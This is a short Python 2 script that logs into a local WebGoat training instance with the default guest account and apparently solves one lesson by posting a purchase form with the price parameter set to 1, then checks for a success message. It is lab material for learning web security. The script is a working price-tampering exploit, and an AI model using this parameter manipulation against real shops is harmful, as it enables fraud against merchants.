import argparse
import re
import json
import sys
import requests

s = requests.Session()

response = s.get("http://127.0.0.1:8080/WebGoat/login.mvc")
print response.status_code

response = s.post("http://127.0.0.1:8080/WebGoat/j_spring_security_check", data={'username': 'guest', 'password': 'guest'})
print response.status_code

response = s.get("http://127.0.0.1:8080/WebGoat/service/lessonmenu.mvc")
url = json.loads(response.text)[16].get('children')[1].get('link')
print url


response = s.get("http://127.0.0.1:8080/WebGoat/"+url)
print response.status_code

response = s.post("http://127.0.0.1:8080/WebGoat/"+url, data={'QTY': 1, 'Price': 1})
print response.status_code
print response.text
if "Congratulations" in response.text:
  print "Passed"
